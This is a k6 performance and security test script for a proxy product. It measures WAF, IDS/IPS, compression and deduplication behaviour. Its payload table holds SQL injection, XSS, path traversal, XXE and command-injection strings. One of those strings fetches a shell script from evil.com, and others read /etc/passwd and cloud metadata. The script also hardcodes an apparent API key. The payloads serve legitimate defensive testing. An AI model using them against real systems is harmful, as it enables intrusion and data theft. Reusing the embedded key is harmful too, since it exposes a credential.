/**
 * Synorix Comprehensive Testing Suite
 * 
 * Tests all features:
 * - WAF (Web Application Firewall) Rules
 * - Suricata IDS/IPS Detection
 * - AI Compression
 * - AI Deduplication
 * 
 * Outputs metrics to InfluxDB for Grafana visualization
 * 
 * Usage:
 *   k6 run -e API_KEY=nxr_xxx -e PROXY_URL=http://WSL_IP:8080 \
 *     -e TEST_TYPE=load --out influxdb=http://localhost:8086/k6 \
 *     perf/k6_comprehensive_test.js
 * 
 * Test Types: load, stress, spike, soak, smoke
 */

import http from 'k6/http';
import { check, sleep, group } from 'k6';
import { Rate, Trend, Counter, Gauge } from 'k6/metrics';
import { htmlReport } from "https://raw.githubusercontent.com/benyegorov/k6-reporter/main/dist/bundle.js";
import { textSummary } from "https://jslib.k6.io/k6-summary/0.0.1/index.js";

// ============================================================================
// CONFIGURATION
// ============================================================================
const API_KEY = __ENV.API_KEY || 'nxr_a851479c0184f6389b953c9dddd90390c22bcd00ab1c94981ba6f40eb23b97b1';
const PROXY_URL = (__ENV.PROXY_URL || 'http://192.168.0.147:8080/user-proxy').replace(/\/$/, '');
const BACKEND_URL = __ENV.BACKEND_URL || 'http://192.168.0.147:3001';
const TEST_TYPE = (__ENV.TEST_TYPE || 'load').toLowerCase();
const THINK_TIME_MS = Number(__ENV.THINK_TIME_MS || 500);

if (!API_KEY) {
  throw new Error('API_KEY is required. Pass with -e API_KEY=nxr_...');
}

// ============================================================================
// CUSTOM METRICS
// ============================================================================
// WAF Metrics
const wafBlockRate = new Rate('waf_block_rate');
const wafBlockedRequests = new Counter('waf_blocked_requests');
const wafAllowedRequests = new Counter('waf_allowed_requests');
const wafResponseTime = new Trend('waf_response_time_ms');

// Suricata IDS/IPS Metrics
const idsDetectionRate = new Rate('ids_detection_rate');
const idsAlertsGenerated = new Counter('ids_alerts_generated');
const ipsBlockedAttacks = new Counter('ips_blocked_attacks');
const idsResponseTime = new Trend('ids_response_time_ms');

// Compression Metrics
const compressionRate = new Rate('compression_applied_rate');
const compressionRatio = new Trend('compression_ratio');
const compressedBytes = new Counter('compressed_bytes');
const uncompressedBytes = new Counter('uncompressed_bytes');
const compressionTime = new Trend('compression_time_ms');

// Deduplication Metrics
const dedupCacheHitRate = new Rate('dedup_cache_hit_rate');
const dedupCacheHits = new Counter('dedup_cache_hits');
const dedupCacheMisses = new Counter('dedup_cache_misses');
const dedupResponseTime = new Trend('dedup_response_time_ms');

// General Performance Metrics
const totalRequests = new Counter('total_requests');
const failedRequests = new Counter('failed_requests');
const successRate = new Rate('success_rate');
const requestDuration = new Trend('request_duration_ms');
const ttfb = new Trend('time_to_first_byte_ms');
const throughput = new Counter('throughput_bytes');
const concurrentUsers = new Gauge('concurrent_users');

// ============================================================================
// TEST SCENARIOS CONFIGURATION
// ============================================================================
function getTestOptions(testType) {
  const baseThresholds = {
    'http_req_failed': ['rate<0.05'],
    'success_rate': ['rate>0.95'],
    'request_duration_ms': ['p(95)<2000', 'p(99)<5000'],
    'waf_response_time_ms': ['p(95)<100'],
    'compression_time_ms': ['p(95)<50'],
  };

  const scenarios = {
    smoke: {
      executor: 'ramping-vus',
      stages: [
        { duration: '1m', target: 5 },
        { duration: '2m', target: 5 },
        { duration: '1m', target: 0 },
      ],
      gracefulRampDown: '30s',
    },
    load: {
      executor: 'ramping-vus',
      stages: [
        { duration: '2m', target: 20 },
        { duration: '5m', target: 50 },
        { duration: '3m', target: 100 },
        { duration: '5m', target: 100 },
        { duration: '2m', target: 0 },
      ],
      gracefulRampDown: '1m',
    },
    stress: {
      executor: 'ramping-vus',
      stages: [
        { duration: '2m', target: 50 },
        { duration: '5m', target: 100 },
        { duration: '5m', target: 200 },
        { duration: '5m', target: 300 },
        { duration: '5m', target: 400 },
        { duration: '3m', target: 0 },
      ],
      gracefulRampDown: '2m',
    },
    spike: {
      executor: 'ramping-vus',
      stages: [
        { duration: '1m', target: 20 },
        { duration: '30s', target: 500 },
        { duration: '2m', target: 500 },
        { duration: '30s', target: 20 },
        { duration: '1m', target: 0 },
      ],
      gracefulRampDown: '1m',
    },
    soak: {
      executor: 'constant-vus',
      vus: 80,
      duration: '30m',
      gracefulRampDown: '2m',
    },
  };

  return {
    scenarios: {
      [testType]: scenarios[testType] || scenarios.load,
    },
    thresholds: baseThresholds,
  };
}

export const options = getTestOptions(TEST_TYPE);

// ============================================================================
// ATTACK PAYLOADS FOR TESTING
// ============================================================================
const ATTACK_PAYLOADS = {
  sqli: [
    "' OR '1'='1",
    "1' UNION SELECT NULL, version()--",
    "admin'--",
    "' OR 1=1--",
    "1' AND SLEEP(5)--",
  ],
  xss: [
    "<script>alert('XSS')</script>",
    "javascript:alert(1)",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
  ],
  lfi: [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "../../../../../../windows/win.ini",
  ],
  rce: [
    "; cat /etc/passwd",
    "| whoami",
    "`id`",
    "$(<payload>)",
    "$(wget http://evil.com/shell.sh)",
  ],
  xxe: [
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>',
  ],
};

// Sample legitimate data for deduplication testing
const SAMPLE_DATA = [
  { id: 'prod-001', category: 'electronics', price: 299.99 },
  { id: 'prod-002', category: 'books', price: 19.99 },
  { id: 'prod-003', category: 'clothing', price: 49.99 },
  { id: 'prod-004', category: 'electronics', price: 599.99 },
  { id: 'prod-005', category: 'home', price: 129.99 },
];

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================
function randomElement(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function getHeaders(acceptEncoding = 'gzip, deflate, br') {
  return {
    'X-API-Key': API_KEY,
    'Accept-Encoding': acceptEncoding,
    'User-Agent': 'k6-performance-test/1.0',
    'Accept': 'application/json',
  };
}

function analyzeResponse(res, metricPrefix = '') {
  totalRequests.add(1);
  
  const success = check(res, {
    'status is 200-299 or expected error': (r) => 
      (r.status >= 200 && r.status < 300) || r.status === 403 || r.status === 400,
  });
  
  successRate.add(success);
  if (!success) failedRequests.add(1);
  
  // Extract timing from headers or calculate
  const timing = res.timings;
  requestDuration.add(timing.duration);
  ttfb.add(timing.waiting);
  
  // Compression detection
  const contentEncoding = res.headers['Content-Encoding'] || res.headers['content-encoding'] || '';
  const bodySize = res.body ? res.body.length : 0;
  const originalSize = parseInt(res.headers['X-Original-Size'] || res.headers['x-original-size'] || bodySize);
  
  throughput.add(bodySize);
  
  if (contentEncoding.includes('gzip') || contentEncoding.includes('br')) {
    compressionRate.add(1);
    compressedBytes.add(bodySize);
    uncompressedBytes.add(originalSize);
    if (originalSize > 0) {
      compressionRatio.add((originalSize - bodySize) / originalSize * 100);
    }
  } else {
    compressionRate.add(0);
  }
  
  // Deduplication detection
  const dedupHit = res.headers['X-Dedup-Cache'] === 'HIT' || 
                   res.headers['x-dedup-cache'] === 'HIT';
  if (dedupHit) {
    dedupCacheHitRate.add(1);
    dedupCacheHits.add(1);
  } else {
    dedupCacheHitRate.add(0);
    dedupCacheMisses.add(1);
  }
  
  // WAF detection
  const wafBlocked = res.status === 403 || 
                     res.headers['X-WAF-Action'] === 'BLOCKED' ||
                     res.headers['x-waf-action'] === 'BLOCKED';
  if (wafBlocked) {
    wafBlockRate.add(1);
    wafBlockedRequests.add(1);
  } else {
    wafBlockRate.add(0);
    wafAllowedRequests.add(1);
  }
  
  return {
    success,
    compressed: compressionRate,
    dedupHit,
    wafBlocked,
  };
}

// ============================================================================
// TEST SCENARIOS
// ============================================================================

/**
 * Main test scenario - executes all feature tests
 */
export default function() {
  concurrentUsers.add(__VU);
  
  // Distribute load across different test groups
  const rand = Math.random();
  
  if (rand < 0.3) {
    // 30% - WAF Testing
    testWAF();
  } else if (rand < 0.5) {
    // 20% - IDS/IPS Testing
    testIDS();
  } else if (rand < 0.75) {
    // 25% - Compression Testing
    testCompression();
  } else {
    // 25% - Deduplication Testing
    testDeduplication();
  }
  
  sleep(THINK_TIME_MS / 1000);
}

/**
 * Test WAF rules with various attack payloads
 */
function testWAF() {
  group('WAF Protection Tests', function() {
    const startTime = Date.now();
    
    // Test SQL Injection
    const sqliPayload = randomElement(ATTACK_PAYLOADS.sqli);
    const sqliRes = http.get(
      `${PROXY_URL}/api/search?q=${encodeURIComponent(sqliPayload)}`,
      { headers: getHeaders(), tags: { test_type: 'waf_sqli' } }
    );
    
    check(sqliRes, {
      'WAF blocks SQLi': (r) => r.status === 403,
    });
    
    if (sqliRes.status === 403) {
      wafBlockedRequests.add(1);
      wafBlockRate.add(1);
    }
    
    // Test XSS
    const xssPayload = randomElement(ATTACK_PAYLOADS.xss);
    const xssRes = http.post(
      `${PROXY_URL}/api/comments`,
      JSON.stringify({ comment: xssPayload }),
      { 
        headers: { ...getHeaders(), 'Content-Type': 'application/json' },
        tags: { test_type: 'waf_xss' }
      }
    );
    
    check(xssRes, {
      'WAF blocks XSS': (r) => r.status === 403,
    });
    
    if (xssRes.status === 403) {
      wafBlockedRequests.add(1);
      wafBlockRate.add(1);
    }
    
    // Test LFI
    const lfiPayload = randomElement(ATTACK_PAYLOADS.lfi);
    const lfiRes = http.get(
      `${PROXY_URL}/api/file?path=${encodeURIComponent(lfiPayload)}`,
      { headers: getHeaders(), tags: { test_type: 'waf_lfi' } }
    );
    
    check(lfiRes, {
      'WAF blocks LFI': (r) => r.status === 403,
    });
    
    if (lfiRes.status === 403) {
      wafBlockedRequests.add(1);
      wafBlockRate.add(1);
    }
    
    wafResponseTime.add(Date.now() - startTime);
  });
}

/**
 * Test Suricata IDS/IPS detection
 */
function testIDS() {
  group('IDS/IPS Detection Tests', function() {
    const startTime = Date.now();
    
    // Simulate port scan
    const portScanRes = http.batch([
      ['GET', `${PROXY_URL}/`, { headers: getHeaders() }],
      ['GET', `${PROXY_URL}/admin`, { headers: getHeaders() }],
      ['GET', `${PROXY_URL}/api`, { headers: getHeaders() }],
      ['GET', `${PROXY_URL}/phpmyadmin`, { headers: getHeaders() }],
    ]);
    
    // Suspicious user agent
    const suspiciousUA = http.get(
      `${PROXY_URL}/`,
      { 
        headers: { 
          ...getHeaders(), 
          'User-Agent': 'sqlmap/1.0-dev' 
        },
        tags: { test_type: 'ids_suspicious_ua' }
      }
    );
    
    // Check if IDS detected the activity
    check(suspiciousUA, {
      'IDS detects suspicious activity': (r) => {
        const detected = r.headers['X-IDS-Alert'] !== undefined ||
                        r.headers['x-ids-alert'] !== undefined;
        if (detected) {
          idsDetectionRate.add(1);
          idsAlertsGenerated.add(1);
        } else {
          idsDetectionRate.add(0);
        }
        return true; // Always pass, we're just tracking
      },
    });
    
    // Known malicious payload
    const maliciousPayload = http.post(
      `${PROXY_URL}/api/data`,
      'cmd=cat /etc/passwd',
      {
        headers: { 
          ...getHeaders(), 
          'Content-Type': 'application/x-www-form-urlencoded' 
        },
        tags: { test_type: 'ids_rce' }
      }
    );
    
    if (maliciousPayload.status === 403 || maliciousPayload.status === 406) {
      ipsBlockedAttacks.add(1);
    }
    
    idsResponseTime.add(Date.now() - startTime);
  });
}

/**
 * Test AI Compression feature
 */
function testCompression() {
  group('AI Compression Tests', function() {
    const startTime = Date.now();
    
    // Request with compression enabled
    const compressedRes = http.get(
      `${PROXY_URL}/api/data/large`,
      { 
        headers: getHeaders('gzip, deflate, br'),
        tags: { test_type: 'compression_enabled' }
      }
    );
    
    const contentEncoding = compressedRes.headers['Content-Encoding'] || 
                           compressedRes.headers['content-encoding'] || '';
    const bodySize = compressedRes.body ? compressedRes.body.length : 0;
    const originalSize = parseInt(
      compressedRes.headers['X-Original-Size'] || 
      compressedRes.headers['x-original-size'] || 
      bodySize
    );
    
    check(compressedRes, {
      'Response is compressed': () => {
        const isCompressed = contentEncoding.includes('gzip') || 
                           contentEncoding.includes('br') ||
                           contentEncoding.includes('deflate');
        if (isCompressed) {
          compressionRate.add(1);
          compressedBytes.add(bodySize);
          uncompressedBytes.add(originalSize);
          if (originalSize > 0) {
            const ratio = (originalSize - bodySize) / originalSize * 100;
            compressionRatio.add(ratio);
          }
        } else {
          compressionRate.add(0);
        }
        return isCompressed;
      },
      'Compression ratio > 30%': () => {
        if (originalSize > 0) {
          const ratio = (originalSize - bodySize) / originalSize * 100;
          return ratio > 30;
        }
        return false;
      },
    });
    
    compressionTime.add(Date.now() - startTime);
  });
}

/**
 * Test AI Deduplication feature
 */
function testDeduplication() {
  group('AI Deduplication Tests', function() {
    const startTime = Date.now();
    
    // Use consistent data for cache testing
    const dataId = randomElement(SAMPLE_DATA).id;
    
    // First request - should miss cache
    const firstRes = http.get(
      `${PROXY_URL}/api/products/${dataId}`,
      { 
        headers: getHeaders(),
        tags: { test_type: 'dedup_first_request' }
      }
    );
    
    sleep(0.1);
    
    // Second request - should hit cache
    const secondRes = http.get(
      `${PROXY_URL}/api/products/${dataId}`,
      { 
        headers: getHeaders(),
        tags: { test_type: 'dedup_cached_request' }
      }
    );
    
    const cacheHit = secondRes.headers['X-Dedup-Cache'] === 'HIT' ||
                     secondRes.headers['x-dedup-cache'] === 'HIT';
    
    check(secondRes, {
      'Dedup cache hit on repeat': () => {
        if (cacheHit) {
          dedupCacheHitRate.add(1);
          dedupCacheHits.add(1);
        } else {
          dedupCacheHitRate.add(0);
          dedupCacheMisses.add(1);
        }
        return cacheHit;
      },
      'Cache hit faster than miss': () => {
        return secondRes.timings.duration < firstRes.timings.duration;
      },
    });
    
    dedupResponseTime.add(Date.now() - startTime);
  });
}

/**
 * Setup function - runs once per VU
 */
export function setup() {
  console.log(`Starting ${TEST_TYPE} test against ${PROXY_URL}`);
  console.log(`API Key: ${API_KEY.substring(0, 8)}...`);
  
  // Verify proxy is reachable
  const healthRes = http.get(`${PROXY_URL}/health`, {
    headers: getHeaders(),
  });
  
  if (healthRes.status !== 200) {
    console.warn(`Warning: Proxy health check returned ${healthRes.status}`);
  }
  
  return {
    startTime: Date.now(),
    testType: TEST_TYPE,
  };
}

/**
 * Teardown function - runs once after all VUs complete
 */
export function teardown(data) {
  const duration = (Date.now() - data.startTime) / 1000;
  console.log(`Test completed in ${duration.toFixed(2)} seconds`);
}

/**
 * Generate HTML and JSON reports
 */
export function handleSummary(data) {
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  
  return {
    [`perf/results/summary_${TEST_TYPE}_${timestamp}.html`]: htmlReport(data),
    [`perf/results/summary_${TEST_TYPE}_${timestamp}.json`]: JSON.stringify(data, null, 2),
    stdout: textSummary(data, { indent: ' ', enableColors: true }),
  };
}
